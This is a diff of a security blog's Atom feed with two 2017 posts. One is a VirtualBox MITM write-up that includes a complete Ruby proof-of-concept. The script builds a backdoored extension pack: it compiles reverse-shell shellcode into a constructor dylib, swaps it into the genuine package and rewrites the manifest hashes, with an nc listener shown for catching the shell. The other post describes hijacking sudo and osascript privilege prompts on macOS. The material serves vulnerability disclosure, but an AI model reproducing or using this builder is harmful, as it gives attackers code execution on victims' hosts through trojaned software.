+--------------------------------------</pre></p><p>If VirtualBox loads this, the code in the constructor will get executed. The
 extpack also has a manifest file which, bizarrely, contains hashes for all of
-the dylibs in a handful of different hash formats.
-
-$ grep VBoxEhciR3.dylib ExtPack.manifest
+the dylibs in a handful of different hash formats.</p><p>$ grep VBoxEhciR3.dylib ExtPack.manifest
 MD5 (darwin.amd64/VBoxEhciR3.dylib) = d3fddbcadfa01e4f9ccd2e23de119c3f
 SHA256 (darwin.amd64/VBoxEhciR3.dylib) =
 f8692e2223ef6b90b84011b437f38873a907933ab6f822e6301d0d4e65427e0a
 SHA512 (darwin.amd64/VBoxEhciR3.dylib) =
 42750441b2054f3b63937e6e54f58af72978091adbe4c5efc18b04f429d84c07ca0818af1f361c0b53dec62b157d3e042a60ae030bfd7e147de73c19de694670
 SHA1 (darwin.amd64/VBoxEhciR3.dylib) = 0eef387c4de5441aa0623ae677ff8f0c21002f46
-SIZE (darwin.amd64/VBoxEhciR3.dylib) = 90064
-
-Oh and they also list the size for good measure lol :P
-
-So if we roll a fake dylib into an extpack tarball and set the size and hashes
+SIZE (darwin.amd64/VBoxEhciR3.dylib) = 90064</p><p>Oh and they also list the size for good measure lol :P</p><p>So if we roll a fake dylib into an extpack tarball and set the size and hashes
 correctly, if the user clicks on the extpack VirtualBox will install it without
 any verification and then load the dylib and execute the constructor as soon as
-the user starts a VM.
-
-There is a catch though, although Vbox will install our modified extpack without
+the user starts a VM.</p><p>There is a catch though, although Vbox will install our modified extpack without
 verification when we click on it manually, the update mechanism performs a
-sha256 hash check.
-
-The update process for vbox is:
-
-1) Older version (eg 5.1.20) is launched, the user is prompted to download the
+sha256 hash check.</p><p>The update process for vbox is:</p><p><pre>1) Older version (eg 5.1.20) is launched, the user is prompted to download the
 newest version.  The link provided here is http:// so this alone could be
 intercepted and modified, but it would require a developer cert to sign a new
-pkg bundle for the user to install.
-
-2) After installing the new version, on the next launch it will prompt the user
+pkg bundle for the user to install.</pre></p><p>2) After installing the new version, on the next launch it will prompt the user
 to install the new extpack for 5.1.22.  The API call to update.virtualbox.org
-happens over SSL so we can&#x27;t mess with the version numbers or the hashes that
-correspond to the new extpack.
-
-Now if we MITM the request to download.virtualbox.org and send our hacked
-extpack, VirtualBox says:
-
-https://m4.rkw.io/img/vbox_reject.png
-
-So it&#x27;s telling us to download it manually from the website.  A user seeing
-this probably wouldn&#x27;t suspect anything other than an Oracle mishap so they
+happens over SSL so we can't mess with the version numbers or the hashes that
+correspond to the new extpack.</p><p>Now if we MITM the request to download.virtualbox.org and send our hacked
+extpack, VirtualBox says:</p><p><pre>https://m4.rkw.io/img/vbox_reject.png</pre></p><p>So it's telling us to download it manually from the website.  A user seeing
+this probably wouldn't suspect anything other than an Oracle mishap so they
 would likely hop over to virtualbox.org to download the extpack manually. The
-website does say &quot;check the hashes&quot; and provides SHA256 and MD5 checksums (which
-are served over SSL).
-
-The website www.virtualbox.org is served over SSL.. but the download link for
+website does say "check the hashes" and provides SHA256 and MD5 checksums (which
+are served over SSL).</p><p>The website www.virtualbox.org is served over SSL.. but the download link for
 the extension pack points to download.virtualbox.org over http://. This is bad
 because it means we can leave www.virtualbox.org un-messed-with so the user sees
 the SSL load correctly (and is lulled into a false sense of security because of
 the SSL padlock), but still MITM download.virtualbox.org in order to send our
-hacked payload.
-
-The filename for the extpack as its linked on the website is slightly different
+hacked payload.</p><p>The filename for the extpack as its linked on the website is slightly different
 to the one requested by the application but we can still intercept it, and since
-it was downloaded manually vbox doesn&#x27;t verify the signature and just merrily
+it was downloaded manually vbox doesn't verify the signature and just merrily
 installs it, allowing us to compromise the host.  Of course if a user is
-paranoid enough to check the hashes then they&#x27;ll notice something is wrong, but
-how many users are realistically going to do that?
-
-Amusingly, on installation it warns you to only install extension packs that you
+paranoid enough to check the hashes then they'll notice something is wrong, but
+how many users are realistically going to do that?</p><p>Amusingly, on installation it warns you to only install extension packs that you
 got from a trusted source - like, I dunno, say, the website of a trusted (?!)
-vendor THAT HAS ITS OWN CERTIFICATE AUTHORITY that you just loaded over SSL?
-
-As soon as any VM is started the code in our malicious dylib gets executed as
-the user running VirtualBox on the host machine.
-
-Obviously this will only work if the user doesn&#x27;t have the latest version, as
+vendor THAT HAS ITS OWN CERTIFICATE AUTHORITY that you just loaded over SSL?</p><p>As soon as any VM is started the code in our malicious dylib gets executed as
+the user running VirtualBox on the host machine.</p><p>Obviously this will only work if the user doesn't have the latest version, as
 otherwise there would be no reason for them to download an extpack. However vbox
 updates are fairly frequent so an attacker waiting around with MITM capability
-probably wouldn&#x27;t have to wait too long before being able to execute this
-attack.
-
-The PoC code below downloads the latest extension pack from the VirtualBox
+probably wouldn't have to wait too long before being able to execute this
+attack.</p><p>The PoC code below downloads the latest extension pack from the VirtualBox
 website and modifies it with a reverse tcp shellcode backdoor that will be
-executed as soon as a VM is started.
-
-To test it you can simply click on it to install it into virtualbox, listen for
-a shell with nc, eg:
-
-$ nc -l 5555
-
-and then start any vm.
-
-https://m4.rkw.io/vbox_extpack_builder.rb.txt
+executed as soon as a VM is started.</p><p>To test it you can simply click on it to install it into virtualbox, listen for
+a shell with nc, eg:</p><p><pre>$ nc -l 5555</pre></p><p>and then start any vm.</p><p>https://m4.rkw.io/vbox_extpack_builder.rb.txt
 6148d6aa7ad2896ae3679ed8e2ff46e7156fd9db9c9ef39fa4116c9566848606
 ----------------------------------------------------------------------------
-#!/usr/bin/env ruby
-
-# RCE PoC builder for VirtualBox extension packs
+#!/usr/bin/env ruby</p><p># RCE PoC builder for VirtualBox extension packs
 # Tested with version 5.2.2 on 30/11/17
 #
 # Discovered by m4rkw, shouts to #coolkids
@@ -2256,159 +1350,89 @@ https://m4.rkw.io/vbox_extpack_builder.rb.txt
 # Once installed, when an OSX/64bit VM is started it will trigger the shellcode
 # and initiate a connectback shell.
 #
-# Thanks to Jacob Hammack for the shellcode
-
-require &#x27;digest&#x27;
-
+# Thanks to Jacob Hammack for the shellcode</p><p>require 'digest'</p><p>puts
+puts "RCE PoC builder for VirtualBox extension pack"
+puts "discovered by m4rkw, shouts to #coolkids"
 puts
-puts &quot;RCE PoC builder for VirtualBox extension pack&quot;
-puts &quot;discovered by m4rkw, shouts to #coolkids&quot;
+puts "PoC is for darwin.amd64 but other architectures may be vulnerable"
 puts
-puts &quot;PoC is for darwin.amd64 but other architectures may be vulnerable&quot;
+puts "This builds a backdoored extension pack which VirtualBox will happily install."
+puts "Once installed, when any VM is started it will trigger the shellcode and"
+puts "initiate a connectback shell to the specified IP and port"
 puts
-puts &quot;This builds a backdoored extension pack which VirtualBox will happily install.&quot;
-puts &quot;Once installed, when any VM is started it will trigger the shellcode and&quot;
-puts &quot;initiate a connectback shell to the specified IP and port&quot;
-puts
-puts &quot;Thanks to Jacob Hammack for the shellcode&quot;
-puts
-
-if ARGV.length &lt; 2
-  puts &quot;Usage: #{__FILE__} &lt;ip&gt; &lt;port&gt;&quot;
+puts "Thanks to Jacob Hammack for the shellcode"
+puts</p><p>if ARGV.length < 2
+  puts "Usage: #{__FILE__} <ip> <port>"
   puts
   exit 0
-end
-
-target_dylib = &quot;VBoxEhciR3.dylib&quot;
-
-puts &quot;compiling attack.dylib...&quot;
-
-File.open(&quot;attack.c&quot;,&quot;w&quot;) do |f|
-  f.write(&quot;#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;sys/mman.h&gt;
-#include &lt;arpa/inet.h&gt;
-#include &lt;unistd.h&gt;
-
-int (*sc)();
-
-char target_ip[] = \&quot;#{ARGV[0]}\&quot;;
-short target_port = #{ARGV[1]};
-
-char shellcode[] =
-  \&quot;\\x41\\xB0\\x02\\x49\\xC1\\xE0\\x18\\x49\\x83\\xC8\\x61\\x4C\\x89\\xC0\\x48\&quot;
-  \&quot;\\x31\\xD2\\x48\\x89\\xD6\\x48\\xFF\\xC6\\x48\\x89\\xF7\\x48\\xFF\\xC7\\x0F\&quot;
-  \&quot;\\x05\\x49\\x89\\xC4\\x49\\xBD\\x01\\x01\\x11\\x5C\\xFF\\xFF\\xFF\\xFF\\x41\&quot;
-  \&quot;\\xB1\\xFF\\x4D\\x29\\xCD\\x41\\x55\\x49\\x89\\xE5\\x49\\xFF\\xC0\\x4C\\x89\&quot;
-  \&quot;\\xC0\\x4C\\x89\\xE7\\x4C\\x89\\xEE\\x48\\x83\\xC2\\x10\\x0F\\x05\\x49\\x83\&quot;
-  \&quot;\\xE8\\x08\\x48\\x31\\xF6\\x4C\\x89\\xC0\\x4C\\x89\\xE7\\x0F\\x05\\x48\\x83\&quot;
-  \&quot;\\xFE\\x02\\x48\\xFF\\xC6\\x76\\xEF\\x49\\x83\\xE8\\x1F\\x4C\\x89\\xC0\\x48\&quot;
-  \&quot;\\x31\\xD2\\x49\\xBD\\xFF\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x49\\xC1\\xED\&quot;
-  \&quot;\\x08\\x41\\x55\\x48\\x89\\xE7\\x48\\x31\\xF6\\x0F\\x05\&quot;;
-
-__attribute__((constructor))
+end</p><p>target_dylib = "VBoxEhciR3.dylib"</p><p>puts "compiling attack.dylib..."</p><p>File.open("attack.c","w") do |f|
+  f.write("#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <arpa/inet.h>
+#include <unistd.h></p><p>int (*sc)();</p><p>char target_ip[] = \"#{ARGV[0]}\";
+short target_port = #{ARGV[1]};</p><p>char shellcode[] =
+  \"\\x41\\xB0\\x02\\x49\\xC1\\xE0\\x18\\x49\\x83\\xC8\\x61\\x4C\\x89\\xC0\\x48\"
+  \"\\x31\\xD2\\x48\\x89\\xD6\\x48\\xFF\\xC6\\x48\\x89\\xF7\\x48\\xFF\\xC7\\x0F\"
+  \"\\x05\\x49\\x89\\xC4\\x49\\xBD\\x01\\x01\\x11\\x5C\\xFF\\xFF\\xFF\\xFF\\x41\"
+  \"\\xB1\\xFF\\x4D\\x29\\xCD\\x41\\x55\\x49\\x89\\xE5\\x49\\xFF\\xC0\\x4C\\x89\"
+  \"\\xC0\\x4C\\x89\\xE7\\x4C\\x89\\xEE\\x48\\x83\\xC2\\x10\\x0F\\x05\\x49\\x83\"
+  \"\\xE8\\x08\\x48\\x31\\xF6\\x4C\\x89\\xC0\\x4C\\x89\\xE7\\x0F\\x05\\x48\\x83\"
+  \"\\xFE\\x02\\x48\\xFF\\xC6\\x76\\xEF\\x49\\x83\\xE8\\x1F\\x4C\\x89\\xC0\\x48\"
+  \"\\x31\\xD2\\x49\\xBD\\xFF\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x49\\xC1\\xED\"
+  \"\\x08\\x41\\x55\\x48\\x89\\xE7\\x48\\x31\\xF6\\x0F\\x05\";</p><p>__attribute__((constructor))
 void customConstructor(int argc, char **argv)
 {
   struct in_addr ip;
-  char *tp = (char *)&amp;target_port;
-
-  shellcode[38] = tp[1];
-  shellcode[39] = tp[0];
-
-  inet_aton(target_ip, (struct in_addr *)&amp;ip);
-  memcpy((char *)&amp;shellcode[40], (char *)&amp;ip.s_addr, 4);
-
-  void *ptr = mmap(0, 0x33, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
-
-  if (ptr == MAP_FAILED) {
-    perror(\&quot;mmap\&quot;);
+  char *tp = (char *)&target_port;</p><p>  shellcode[38] = tp[1];
+  shellcode[39] = tp[0];</p><p>  inet_aton(target_ip, (struct in_addr *)&ip);
+  memcpy((char *)&shellcode[40], (char *)&ip.s_addr, 4);</p><p>  void *ptr = mmap(0, 0x33, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);</p><p>  if (ptr == MAP_FAILED) {
+    perror(\"mmap\");
     exit(-1);
   }
   memcpy(ptr, shellcode, sizeof(shellcode));
-  sc = ptr;
-
-  sc();
+  sc = ptr;</p><p>  sc();
 }
-&quot;)
+")
+end</p><p>system("clang -dynamiclib -std=gnu99 attack.c -o attack.dylib")
+File.delete("attack.c")</p><p>if !File.exist? "vbox_exp_temp"
+  Dir.mkdir("vbox_exp_temp")
 end
-
-system(&quot;clang -dynamiclib -std=gnu99 attack.c -o attack.dylib&quot;)
-File.delete(&quot;attack.c&quot;)
-
-if !File.exist? &quot;vbox_exp_temp&quot;
-  Dir.mkdir(&quot;vbox_exp_temp&quot;)
-end
-Dir.chdir(&quot;vbox_exp_temp&quot;)
-
-puts &quot;looking for latest extpack at virtualbox.org...&quot;
-
-downloads_html = `curl -s https://www.virtualbox.org/wiki/Downloads`
-
-match = downloads_html.match(/http:\/\/download\.virtualbox\.org\/virtualbox\/[\d\.]+\/Oracle_VM_VirtualBox_Extension_Pack[\d\.\-]+\.vbox-extpack/)
-
-if !match or !match[0]
-  puts &quot;failed to find http:// link to the extpack.&quot;
+Dir.chdir("vbox_exp_temp")</p><p>puts "looking for latest extpack at virtualbox.org..."</p><p>downloads_html = `curl -s https://www.virtualbox.org/wiki/Downloads`</p><p>match = downloads_html.match(/http:\/\/download\.virtualbox\.org\/virtualbox\/[\d\.]+\/Oracle_VM_VirtualBox_Extension_Pack[\d\.\-]+\.vbox-extpack/)</p><p>if !match or !match[0]
+  puts "failed to find http:// link to the extpack."
   exit 1
-end
-
-puts &quot;downloading extpack... &quot;
-
-filename = match[0].split(&quot;/&quot;)[-1]
-
-system(&quot;curl -s #{match[0]} -o #{filename}&quot;)
-
-puts &quot;unpacking extpack... &quot;
-
-system(&quot;tar zxf #{filename}&quot;)
-File.delete(filename)
-
-puts &quot;substituting #{target_dylib}... &quot;
-
-File.delete(&quot;darwin.amd64/#{target_dylib}&quot;)
-File.rename(&quot;../attack.dylib&quot;, &quot;darwin.amd64/#{target_dylib}&quot;)
-
-puts &quot;patching manifest... &quot;
-
-File.open(&quot;ExtPack.manifest.new&quot;,&quot;w&quot;) do |f|
-  File.read(&quot;ExtPack.manifest&quot;).chomp.split(&quot;\n&quot;).each do |line|
-    r = target_dylib.gsub(&#x27;.&#x27;,&#x27;\.&#x27;)
-
-    if (match = line.match(/\A(MD5|SHA256|SHA512|SHA1|SIZE) \(darwin\.amd64\/#{r}\)/))
+end</p><p>puts "downloading extpack... "</p><p>filename = match[0].split("/")[-1]</p><p>system("curl -s #{match[0]} -o #{filename}")</p><p>puts "unpacking extpack... "</p><p>system("tar zxf #{filename}")
+File.delete(filename)</p><p>puts "substituting #{target_dylib}... "</p><p>File.delete("darwin.amd64/#{target_dylib}")
+File.rename("../attack.dylib", "darwin.amd64/#{target_dylib}")</p><p>puts "patching manifest... "</p><p>File.open("ExtPack.manifest.new","w") do |f|
+  File.read("ExtPack.manifest").chomp.split("\n").each do |line|
+    r = target_dylib.gsub('.','\.')</p><p>    if (match = line.match(/\A(MD5|SHA256|SHA512|SHA1|SIZE) \(darwin\.amd64\/#{r}\)/))
       case match[1]
-      when &quot;MD5&quot;
-        md5 = Digest::MD5.hexdigest File.read(&quot;darwin.amd64/#{target_dylib}&quot;)
-        f.write(&quot;MD5 (darwin.amd64/#{target_dylib}) = #{md5}\n&quot;)
-      when &quot;SHA256&quot;
-        sha256 = Digest::SHA256.hexdigest File.read(&quot;darwin.amd64/#{target_dylib}&quot;)
-        f.write(&quot;SHA256 (darwin.amd64/#{target_dylib}) = #{sha256}\n&quot;)
-      when &quot;SHA512&quot;
-        sha512 = Digest::SHA512.hexdigest File.read(&quot;darwin.amd64/#{target_dylib}&quot;)
-        f.write(&quot;SHA512 (darwin.amd64/#{target_dylib}) = #{sha512}\n&quot;)
-      when &quot;SHA1&quot;
-        sha1 = Digest::SHA1.hexdigest File.read(&quot;darwin.amd64/#{target_dylib}&quot;)
-        f.write(&quot;SHA1 (darwin.amd64/#{target_dylib}) = #{sha1}\n&quot;)
-      when &quot;SIZE&quot;
-        size = File.size &quot;darwin.amd64/#{target_dylib}&quot;
-        f.write(&quot;SIZE (darwin.amd64/#{target_dylib}) = #{size}\n&quot;)
+      when "MD5"
+        md5 = Digest::MD5.hexdigest File.read("darwin.amd64/#{target_dylib}")
+        f.write("MD5 (darwin.amd64/#{target_dylib}) = #{md5}\n")
+      when "SHA256"
+        sha256 = Digest::SHA256.hexdigest File.read("darwin.amd64/#{target_dylib}")
+        f.write("SHA256 (darwin.amd64/#{target_dylib}) = #{sha256}\n")
+      when "SHA512"
+        sha512 = Digest::SHA512.hexdigest File.read("darwin.amd64/#{target_dylib}")
+        f.write("SHA512 (darwin.amd64/#{target_dylib}) = #{sha512}\n")
+      when "SHA1"
+        sha1 = Digest::SHA1.hexdigest File.read("darwin.amd64/#{target_dylib}")
+        f.write("SHA1 (darwin.amd64/#{target_dylib}) = #{sha1}\n")
+      when "SIZE"
+        size = File.size "darwin.amd64/#{target_dylib}"
+        f.write("SIZE (darwin.amd64/#{target_dylib}) = #{size}\n")
       end
     else
-      f.write(line + &quot;\n&quot;)
+      f.write(line + "\n")
     end
   end
-end
-
-File.delete(&quot;ExtPack.manifest&quot;)
-File.rename(&quot;ExtPack.manifest.new&quot;, &quot;ExtPack.manifest&quot;)
-
-puts &quot;creating tarball... &quot;
-system(&quot;tar -zcf ../#{filename} *&quot;)
-
-Dir.chdir(&quot;..&quot;)
-system(&quot;rm -rf vbox_exp_temp&quot;)
-
-puts &quot;\ncreated backdoored extpack: #{filename}\n\n&quot;
-</pre></summary>
+end</p><p>File.delete("ExtPack.manifest")
+File.rename("ExtPack.manifest.new", "ExtPack.manifest")</p><p>puts "creating tarball... "
+system("tar -zcf ../#{filename} *")</p><p>Dir.chdir("..")
+system("rm -rf vbox_exp_temp")</p><p>puts "\ncreated backdoored extpack: #{filename}\n\n"
+</p></summary>
     <title>Owning VirtualBox via MITM</title>
     <updated>2017-11-30T08:25:03+00:00</updated>
     <dc:date>2017-11-30T08:25:03+00:00</dc:date>
@@ -2416,60 +1440,34 @@ puts &quot;\ncreated backdoored extpack: #{filename}\n\n&quot;
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>With all the hype today about the blank-password root bug in High Sierra I
-thought I&#x27;d write a quick post about escalation hihacking on macOS and how
-common it is for software to be vulnerable to this.
-
-Consider the case of malware gaining execution on a mac. This is pretty bad to
-begin with but it&#x27;s all the more worse if the malware obtains root access. Even
-with apple&#x27;s &quot;rootless&quot; feature it still provides a potential path to
-rootkitting the machine, loading kexts etc.
-
-I&#x27;ve found a slew of privilege escalation issues in various Mac applications
-this year but as well as these more direct exploits I&#x27;ve also noticed that a lot
+    <summary><p>With all the hype today about the blank-password root bug in High Sierra I
+thought I'd write a quick post about escalation hihacking on macOS and how
+common it is for software to be vulnerable to this.</p><p>Consider the case of malware gaining execution on a mac. This is pretty bad to
+begin with but it's all the more worse if the malware obtains root access. Even
+with apple's "rootless" feature it still provides a potential path to
+rootkitting the machine, loading kexts etc.</p><p>I've found a slew of privilege escalation issues in various Mac applications
+this year but as well as these more direct exploits I've also noticed that a lot
 of mac software that requires elevated privileges requested with an
 authentication prompt does so in a way that can be easily and silently hijacked
-by a third party process.
-
-The two most common insecure ways of doing this that I&#x27;ve seen are:
-
-1) sudo
-
-2) applescript via osascript, eg &quot;execute blah with administrator privileges&quot;
-
-In both cases these actions pause waiting for user authentication and are
+by a third party process.</p><p>The two most common insecure ways of doing this that I've seen are:</p><p><pre>1) sudo</pre></p><p>2) applescript via osascript, eg "execute blah with administrator privileges"</p><p>In both cases these actions pause waiting for user authentication and are
 clearly visible in the process list. Since we can see the exact shell commands
 that are going to be executed with sudo or osascript and that the user will take
 at least a couple of seconds to enter their password, we have the perfect
-opportunity to steal the escalation.
-
-Consider this sudo command in the process list:
-
-sudo chown root:wheel /tmp/some/file &amp;&amp; sudo chmod 4755 /tmp/some/file
-
-If we know that this will occasionally occur given that application X is
+opportunity to steal the escalation.</p><p>Consider this sudo command in the process list:</p><p><pre>sudo chown root:wheel /tmp/some/file && sudo chmod 4755 /tmp/some/file</pre></p><p>If we know that this will occasionally occur given that application X is
 installed we can lie in wait until it happens and then switch /tmp/some/file out
-for some other arbitrary payload. Once it&#x27;s been made root-owned and +s we can
+for some other arbitrary payload. Once it's been made root-owned and +s we can
 then use it to escalate, swap the original file back in place and set the
 required permissions on that so the user will have no idea that anything
-happened.
-
-To make this even easier we can even send a STOP signal to the parent process to
+happened.</p><p>To make this even easier we can even send a STOP signal to the parent process to
 effectively pause it until our meddling is complete and then send a CONT signal
-to resume it.
-
-An example of an exploit using this technique is my code for the 5.0.0 release
-of the Hashicorp vagrant-vmware-fusion plugin:
-
-https://m4.rkw.io/blog/cve201715884-local-root-privesc-in-hashicorp-vagrantvmwarefusion-500.html
-
-However this vulnerability is present in loads of Mac software. Eventually smart
+to resume it.</p><p>An example of an exploit using this technique is my code for the 5.0.0 release
+of the Hashicorp vagrant-vmware-fusion plugin:</p><p><pre>https://m4.rkw.io/blog/cve201715884-local-root-privesc-in-hashicorp-vagrantvmwarefusion-500.html</pre></p><p>However this vulnerability is present in loads of Mac software. Eventually smart
 malware authors will realise this and start rolling such exploits into their
 malware so that they can escalate opportunistically.
-</pre></summary>
+</p></summary>
     <title>Escalation hijacking on macs</title>
     <updated>2017-11-29T21:04:29+00:00</updated>
     <dc:date>2017-11-29T21:04:29+00:00</dc:date>
   </entry>
-  <dc:date>2022-02-13T16:58:05+00:00</dc:date>
+  <dc:date>2022-02-14T11:05:17+00:00</dc:date>
 </feed>
